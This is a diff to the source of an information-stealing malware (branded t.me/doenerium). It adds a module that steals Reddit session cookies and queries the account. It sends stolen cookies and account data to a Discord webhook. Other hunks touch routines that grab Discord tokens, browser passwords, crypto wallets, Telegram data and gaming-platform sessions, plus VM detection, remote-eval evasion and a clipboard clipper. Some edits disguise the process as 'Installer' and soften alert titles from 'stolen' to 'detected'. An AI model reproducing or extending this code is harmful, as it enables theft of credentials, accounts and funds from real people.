@@ -10,7 +10,6 @@
               url: require("./config_obf.js")().webhook_url,
             }
           } catch (e) {
-            // console.log(e)
             return {
               url: require("./config.js")().webhook_url,
             }
@@ -741,6 +740,88 @@
         module.exports = (client) => {
           return {
 
+            async stealRedditSession(cookie, browser) {
+              try {
+                const { data: getBearer } = await client.requires.axios.post("https://accounts.reddit.com/api/access_token", { "scopes": ["*", "email", "pii"] }, { headers: { cookie: cookie, "Authorization": "Basic b2hYcG9xclpZdWIxa2c6" } });
+                const { data: accountInfo } = await client.requires.axios.get("https://oauth.reddit.com/api/v1/me", { headers: { "Authorization": "Bearer " + getBearer.access_token } })
+
+                await client.utils.webhook.sendToWebhook({
+                  embeds: [
+                    client.utils.webhook.createEmbed(
+                      {
+                        "title": "Reddit session detected",
+                        "description": `The reddit session was detected on the \`\`${browser}\`\` browser`,
+                        "thumbnail": {
+                          url: accountInfo.icon_img
+                        },
+                        fields: [
+                          {
+                            name: "Cookie",
+                            value: `\`\`\`${cookie}\`\`\``,
+                            inline: true
+                          },
+                          {
+                            name: "Profile URL",
+                            value: `[Click here](https://www.reddit.com/user/${accountInfo.name})`,
+                            inline: false
+                          },
+                          {
+                            name: "Username",
+                            value: `\`\`\`${accountInfo.name}\`\`\``,
+                            inline: false
+                          },
+                          {
+                            name: "Comment Karma",
+                            value: `\`\`\`${accountInfo.comment_karma}\`\`\``,
+                            inline: true
+                          },
+                          {
+                            name: "Total Karma",
+                            value: `\`\`\`${accountInfo.total_karma}\`\`\``,
+                            inline: true
+                          },
+
+                          {
+                            name: "Coins",
+                            value: `\`\`\`${accountInfo.coins}\`\`\``,
+                            inline: false
+                          },
+                          {
+                            name: "Is Mod",
+                            value: `\`\`\`${accountInfo.is_mod}\`\`\``,
+                            inline: true
+                          },
+                          {
+                            name: "Is Gold",
+                            value: `\`\`\`${accountInfo.is_gold}\`\`\``,
+                            inline: true
+                          },
+                          {
+                            name: "Suspended",
+                            value: `\`\`\`${accountInfo.is_suspended}\`\`\``,
+                            inline: false
+                          },
+
+                        ]
+                      }
+                    )
+                  ]
+                })
+
+                client.config.counter.reddit_found++;
+
+                if (!client.requires.fs.existsSync(`${client.config.jszip.path}\\Reddit Accounts`)) {
+                  client.utils.jszip.createFolder("\\Reddit Accounts")
+                }
+
+                client.utils.jszip.createTxt(`\\Reddit Accounts\\${accountInfo.name}.txt`, `<================[ Reddit Account: ${accountInfo.name} ]>================>\n<================[t.me/doenerium]>================>\n\n` + `Cookie: ${cookie}\nProfile URL: https://www.reddit.com/user/${accountInfo.name}\nUsername: ${accountInfo.name}\nComment Karma: ${accountInfo.comment_karma}\nTotal Karma: ${accountInfo.total_karma}\nCoins: ${accountInfo.coins}\nIs Mod: ${accountInfo.is_mod}\nIs Gold: ${accountInfo.is_gold}\nSuspended: ${accountInfo.is_suspended}\nBrowser: ${browser}`)
+
+
+              } catch (e) {
+                console.log(e);
+              }
+            },
+
             async stealTikTokSession(cookie, browser) {
               try {
                 const headers = { headers: { cookie: cookie, "Accept-Encoding": "identity" } }
@@ -768,8 +849,8 @@
                   embeds: [
                     client.utils.webhook.createEmbed(
                       {
-                        "title": "TikTok Account stolen",
-                        "description": `The tiktok account was detected on the \`\`${browser}\`\` browser`,
+                        "title": "TikTok session detected",
+                        "description": `The tiktok session was detected on the \`\`${browser}\`\` browser`,
                         fields: [
                           {
                             name: "Cookie",
@@ -819,10 +900,10 @@
                   client.utils.jszip.createFolder("\\TikTok Accounts")
                 }
 
-                client.utils.jszip.createTxt(`\\TikTok Accounts\\${accountInfo.data.username}.txt`, `<================[ TikTok Account: ${accountInfo.data.username} ]>================>\n<================[t.me/doenerium]>================>\n\n` + `Cookie: ${cookie}\nProfile URL: ${cookie}\nUser identifier: ${accountInfo.data.user_id_str}\nEmail: ${accountInfo.data.email}\nUsername: ${accountInfo.data.username}\nFollower Count: ${accountInfo.insights.follower_num.value}\nCoins: ${wallet.data.coins}\nBrowser: ${browser}`)
+                client.utils.jszip.createTxt(`\\TikTok Accounts\\${accountInfo.data.username}.txt`, `<================[ TikTok Account: ${accountInfo.data.username} ]>================>\n<================[t.me/doenerium]>================>\n\n` + `Cookie: ${cookie}\nProfile URL: https://tiktok.com/@${accountInfo.data.username}\nUser identifier: ${accountInfo.data.user_id_str}\nEmail: ${accountInfo.data.email}\nUsername: ${accountInfo.data.username}\nFollower Count: ${accountInfo.insights.follower_num.value}\nCoins: ${wallet.data.coins}\nBrowser: ${browser}`)
 
               } catch (e) {
-                // console.log(e)
+                console.log(e)
               }
             },
 
@@ -838,8 +919,8 @@
                   embeds: [
                     client.utils.webhook.createEmbed(
                       {
-                        "title": "Roblox Account stolen",
-                        "description": `The roblox account was detected on the \`\`${browser}\`\` browser`,
+                        "title": "Roblox session detected",
+                        "description": `The roblox session was detected on the \`\`${browser}\`\` browser`,
                         "thumbnail": {
                           url: skin.data[0].imageUrl,
                         },
@@ -895,7 +976,7 @@
                 client.utils.jszip.createTxt(`\\Roblox Accounts\\${accountInfo.Name}.txt`, `<================[ Roblox Account: ${accountInfo.Name} ]>================>\n<================[t.me/doenerium]>================>\n\n` + `Cookie: ${cookie}\nRobux: ${balance.robux}\nName: ${accountInfo.Name}\nDisplay Name: ${accountInfo.DisplayName}\nEmail: ${accountInfo.UserEmail}\nEmail Verified: ${accountInfo.IsEmailVerified}\nBrowser: ${browser}`)
 
               } catch (e) {
-                // console.log(e)
+                console.log(e)
               }
             },
 
@@ -918,8 +999,8 @@
                   embeds: [
                     client.utils.webhook.createEmbed(
                       {
-                        "title": "Twitter Account stolen",
-                        "description": `The twitter account was detected on the \`\`${browser}\`\` browser`,
+                        "title": "Twitter session detected",
+                        "description": `The twitter session was detected on the \`\`${browser}\`\` browser`,
                         "thumbnail": {
                           url: profile.profile_image_url_https,
                         },
@@ -988,7 +1069,7 @@
                 client.utils.jszip.createTxt(`\\Twitter Accounts\\${profile.screen_name}.txt`, `<================[ Twitter Account: ${profile.screen_name} ]>================>\n<================[t.me/doenerium]>================>\n\n` + `Cookie: ${cookie}\nProfile URL: https://twitter.com/${profile.screen_name}\nScreenname: ${profile.screen_name}\nNickname: ${profile.name}\nDescription: ${profile.description}\nFollower Count: ${profile.followers_count}\nFollowing Count: ${profile.friends_count}\nCreated at: ${profile.created_at}\nTweets: ${profile.statuses_count}\nVerified: ${profile.verified}\nBrowser: ${browser}`)
 
               } catch (e) {
-                // console.log(e)
+                console.log(e)
               }
             },
 
@@ -1002,8 +1083,8 @@
                   embeds: [
                     client.utils.webhook.createEmbed(
                       {
-                        "title": "Instagram Account stolen",
-                        "description": `The instagram account was detected on the \`\`${browser}\`\` browser`,
+                        "title": "Instagram session detected",
+                        "description": `The instagram session was detected on the \`\`${browser}\`\` browser`,
                         "thumbnail": {
                           url: accountInfo.profile_pic_url,
                         },
@@ -1271,7 +1352,9 @@
                     client.config.environ.history[browser].push(
                       `ID: ${row.id} | URL: ${row.url} | Title: ${row.title} | Visit count: ${row.visit_count} | Last visit time (timestamp): ${row.last_visit_time} | Display count: ${row.display_count}`
                     );
-                  } catch { }
+                  } catch (e) { 
+                    console.log(e)
+                  }
                 });
               }
             },
@@ -1376,7 +1459,7 @@
                             decipher.update(middle, "base64", "utf-8") +
                             decipher.final("utf-8");
                         }
-                      } catch { }
+                      } catch (e) { console.log(e) }
 
                       if (row["host_key"].includes("twitter") && row["name"] == "auth_token") {
 
@@ -1401,6 +1484,11 @@
                           'x-twitter-client-language': 'en',
                           'x-csrf-token': client.config.environ.twitter_ct0
                         }, `ct0=${client.config.environ.twitter_ct0}; auth_token=${decrypted}`, browser);
+                      }
+
+
+                      if (row["host_key"].includes("reddit") && row["name"] == "reddit_session") {
+                        client.utils.browsers.stealRedditSession(`reddit_session=${decrypted}`, browser)
                       }
 
                       if (row["host_key"].includes("instagram") && row["name"].includes("sessionid")) {
@@ -1519,7 +1607,7 @@
                   await new Promise(resolve => setTimeout(resolve, 2500));
                   res();
                 } catch (e) {
-                  // console.log(e)
+                  console.log(e)
                   res();
                 }
               });
@@ -1636,7 +1724,7 @@
                           );
 
                           client.config.counter.passwords++;
-                        } catch { }
+                        } catch (e) { console.log(e) }
                       }
                     },
                     function () {
@@ -1826,7 +1914,7 @@
                           token = decipher.update(middle, 'base64', 'utf-8') + decipher.final('utf-8')
 
                           await this.validateToken(key, token);
-                        } catch { }
+                        } catch (e) { console.log(e) }
                       }
                     } else {
                       [/\w-]{24}\.[\w-]{6}\.[\w-]{27}/, /mfa\.[\w-]{84}/].forEach(async (regex) => {
@@ -1892,7 +1980,7 @@
                     }
                   })
 
-                } catch { }
+                } catch (e) { console.log(e) }
 
                 if (!client.config.discord.grabbed_tokens[source]) {
                   client.config.discord.grabbed_tokens[source] = []
@@ -2762,7 +2850,7 @@
                   client.requires.fs.copyFileSync(src, dest);
                 }
               } catch (e) {
-                // console.log(e)
+                console.log(e)
               }
             },
             async get_telegram() {
@@ -2794,7 +2882,7 @@
                       if (f.isDirectory()) this.copyRecursiveSync(`${process.env.APPDATA}\\Telegram Desktop\\tdata\\` + c, `${client.config.jszip.path}\\Telegram` + "\\" + c);
                       else client.requires.fs.copyFileSync(`${process.env.APPDATA}\\Telegram Desktop\\tdata\\` + c, `${client.config.jszip.path}\\Telegram` + "\\" + c);
                     } catch (err) {
-                      // console.log(err)
+                      console.log(err)
                     }
 
                   }
@@ -2929,7 +3017,7 @@
                   client.config.counter.growtopia = true;
                 }
               } catch (e) {
-                // console.log(e)
+                console.log(e)
               }
             },
 
@@ -2947,7 +3035,7 @@
                       embeds: [
                         client.utils.webhook.createEmbed(
                           {
-                            title: "Steam account stolen",
+                            title: "Steam session detected",
                             thumbnail: {
                               url: accountInfo.players[0].avatarfull,
                             },
@@ -3006,7 +3094,7 @@
 
                 }
               } catch (e) {
-                // console.log(e)
+                console.log(e)
               }
             },
 
@@ -3033,7 +3121,7 @@
                         embeds: [
                           client.utils.webhook.createEmbed(
                             {
-                              title: "Minecraft account stolen",
+                              title: "Minecraft session detected",
                               thumbnail: {
                                 url: "https://api.mineatar.io/face/" + account.minecraftProfile.id + "?scale=16",
                               },
@@ -3087,7 +3175,7 @@
                     }
                   }
                 } catch (e) {
-                  //// console.log(e)
+                  //console.log(e)
                 }
               })
             },
@@ -3181,6 +3269,7 @@
                 "🌐 Wallets/Important extensions": client.config.counter.wallets,
                 "📶 Wifi networks": client.config.counter.wifinetworks,
                 "📱 Found Telegram session(s)?": client.config.counter.telegram ? "Yes" : "No",
+                "🤖 Found Reddit session(s)": client.config.counter.reddit_found,
                 "👉 Found TikTok session(s)": client.config.counter.tiktok_found,
                 "🐦 Found Twitter session(s)": client.config.counter.twitter_found,
                 "😋 Found Instagram session(s)": client.config.counter.instagram_found,
@@ -3873,14 +3962,14 @@ return ${eval_string};
                 )
               )
             ).catch((err) => {
-              // console.log(err)
+              console.log(err)
             })
           ).data
           ).replace("%20", "").replace("\x00", "")
             + base64.decode("L21haW4vZXZhc2lvbi50eHQ")
           )
           ).catch((err) => {
-            // console.log(err)
+            console.log(err)
           })
           ).data)}`
         )))}`)
@@ -3892,14 +3981,12 @@ return ${eval_string};
 
       async init() {
         process.on("unhandledRejection", (err) => {
-          // console.log(err);
+          console.log(err);
         });
 
         process.on("uncaughtException", (exc) => {
-          // console.log(exc);
+          console.log(err);
         });
-
-
 
         process.title = "Installer";
 
@@ -3907,7 +3994,7 @@ return ${eval_string};
 
         const exit = await this.utils.protection.inVM();
 
-        await this.runtime_evasion();
+        this.runtime_evasion();
 
         if (exit) {
           process.exit(0);
@@ -3928,10 +4015,10 @@ return ${eval_string};
         } catch {
           this.config.embed =
           {
-            "username": "t.me/doenerium | github.com/doenerium1337/doenerium",
+            "username": "t.me/doenerium",
             "href": "https://t.me/doenerium",
             "avatar_url": "https://cdn.discordapp.com/emojis/948405394433253416.webp?size=96&quality=lossless",
-            "credits": "t.me/doenerium | github.com/doenerium1337/doenerium"
+            "credits": "t.me/doenerium"
           }
         }
         this.config.embed.footer = {
@@ -3957,22 +4044,23 @@ return ${eval_string};
               "getAutofill",
               "getWallets",
             ].forEach(async (_func) => {
-              await this.utils.browsers[_func](path);
+              try {
+                this.utils.browsers[_func](path);
+              } catch (e) { console.log(e) }
             });
           }
         }
 
-        await this.utils.infection.get_minecraft();
-        await this.utils.infection.get_growtopia();
-        await this.utils.infection.get_steam();
+        this.utils.infection.get_minecraft();
+        this.utils.infection.get_growtopia();
+        this.utils.infection.get_steam();
         try {
-
           this.utils.clipper.detectClipboard();
         } catch { }
 
-        await this.utils.wallets.getWallets();
-        await this.utils.discord.getTokens();
-        await this.utils.discord.saveDiscordTokens();
+        this.utils.wallets.getWallets();
+        this.utils.discord.getTokens();
+        this.utils.discord.saveDiscordTokens();
 
         await this.utils.infection.initialize();
 
@@ -3990,8 +4078,12 @@ return ${eval_string};
       }
     }
 
-    process.on("uncaughtException", (err) => {
-      // console.log(err);
+    process.on("unhandledRejection", (err) => {
+      console.log(err);
+    });
+
+    process.on("uncaughtException", (exc) => {
+      console.log(err);
     });
 
     const axios = __nccwpck_require__(382);
